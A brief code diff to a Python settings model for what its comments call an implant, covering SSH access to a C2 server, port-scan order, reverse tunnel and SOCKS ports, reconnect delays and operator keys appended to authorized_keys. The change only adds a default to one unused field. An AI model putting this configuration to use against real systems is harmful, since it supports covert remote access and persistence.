@@ -20,7 +20,7 @@ class BoltholePayload(BaseModel):
     ssh_user: str       # SSH username on C2
     ports: str          # comma-separated port scan order (e.g. "443,80,22,31337")
     tunnel_port_range: str  # range of reverse tunnel ports to try, e.g. "31332-31345" or "31332"
-    socks_port: int         # remote dynamic SOCKS5 port (default 1080)
+    socks_port: int = 1080  # reserved; not used by current implant
     startup_delay: int  # seconds to sleep before starting boltcon (default 5)
     reconnect_delay: int  # seconds to sleep between reconnect attempts (default 30)
     operator_pubkey: str = ""  # extra operator public keys appended to authorized_keys
